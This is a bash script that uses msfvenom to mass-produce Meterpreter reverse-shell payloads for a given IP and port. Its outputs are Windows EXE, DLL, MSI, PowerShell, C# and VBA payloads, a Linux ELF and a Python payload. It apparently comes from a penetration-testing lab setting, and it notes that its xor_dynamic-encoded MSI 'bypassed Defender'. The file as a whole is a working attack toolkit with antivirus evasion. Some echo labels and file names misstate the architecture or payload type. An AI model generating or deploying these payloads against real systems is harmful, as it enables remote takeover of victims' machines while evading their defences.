#!/bin/bash

if [ $# -ne 2 ]; then
    echo "Usage: $0 <IP> <PORT>"
    echo ""
    echo "This script will take those two arguments, and generate a suite of msfvenom payloads to use"
    exit 1
fi

ip=$1
port=$2

# Make our output directories
mkdir raw
mkdir csharp
mkdir powershell
mkdir vbapplication
mkdir exe
mkdir dll
mkdir elf
mkdir python
mkdir msi

echo ""
echo "[*] Generating /windows/meterpreter/reverse_tcp payloads (for 32-bit Windows)"

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f vbapplication -o vbapplication/vbapplication-x64-reverse_tcp > /dev/null 2>&1
echo "[+] Finished reverse_tcp vbapplication payload!"

echo ""
echo "[*] Generating /windows/meterpreter/reverse_tcp payloads (for 32-bit Windows)"

msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f vbapplication -o vbapplication/vbapplication-x64-reverse_https > /dev/null 2>&1
echo "[+] Finished reverse_https vbapplication payload!"

echo ""
echo "[*] Generating /windows/x64/meterpreter/reverse_tcp payloads"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f raw -o raw/raw-x64-reverse_tcp.bin > /dev/null 2>&1
echo "[+] Finished raw payload!"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f csharp -o csharp/csharp-x64-reverse_tcp.txt > /dev/null 2>&1
echo "[+] Finished csharp payload!"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f ps1 -o powershell/ps1-x64-reverse_tcp.txt > /dev/null 2>&1
echo "[+] Finished powershell payload!"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f vbapplication -o vbapplication/vbapplication-x64-reverse_tcp > /dev/null 2>&1
echo "[+] Finished vbapplication payload!"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f exe -o exe/x64-reverse_tcp.exe > /dev/null 2>&1
echo "[+] Finished exe payload!"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f dll -o dll/x64-reverse_tcp.dll > /dev/null 2>&1
echo "[+] Finished dll payload!"

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf -o elf/elf-x64-reverse_tcp > /dev/null 2>&1
echo "[+] Finished ELF payload!"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f msi EXITFUNC=thread -e x64/xor_dynamic -o msi/msi-x64-reverse_tcp.msi 2>&1
echo "[+] Finished msi payload, this uses -e x64/xor_dynamic (bypassed Defender in the labs)!"

echo ""
echo "[*] Finished /windows/x64/meterpreter/reverse_tcp payloads!"

echo ""
echo "[*] Generating /windows/x64/meterpreter/reverse_https payloads"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f raw -o raw/raw-x64-reverse_https.bin > /dev/null 2>&1
echo "[+] Finished raw payload!"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f csharp -o csharp/csharp-x64-reverse_https.txt > /dev/null 2>&1
echo "[+] Finished csharp payload!"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f ps1 -o powershell/ps1-x64-reverse_https.txt > /dev/null 2>&1
echo "[+] Finished powershell payload!"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f vbapplication -o vbapplication/vbapplication-x64-reverse_https > /dev/null 2>&1
echo "[+] Finished vbapplication payload!"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f exe -o exe/exe-x64-reverse_https.exe > /dev/null 2>&1
echo "[+] Finished exe payload!"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f dll -o dll/dll-x64-reverse_https.dll > /dev/null 2>&1
echo "[+] Finished dll payload!"

msfvenom -p linux/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port -f elf -o elf/elf-x64-reverse_https > /dev/null 2>&1
echo "[+] Finished ELF payload!"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port -f msi EXITFUNC=thread -e x64/xor_dynamic -o msi/msi-x64-reverse_https.msi > /dev/null 2>&1
echo "[+] Finished msi payload, this uses -e x64/xor_dynamic (bypassed Defender in the labs)!"

echo ""
echo "[*] Finished /windows/x64/meterpreter/reverse_https payloads!"

echo ""
echo "[*] Generating python/meterpreter/reverse_tcp_ssl payloads"

msfvenom -p python/meterpreter/reverse_tcp_ssl LHOST=$ip LPORT=$port -f raw -o python/reverse_tcp_ssl.py > /dev/null 2>&1
echo "[+] Finished Python payload!"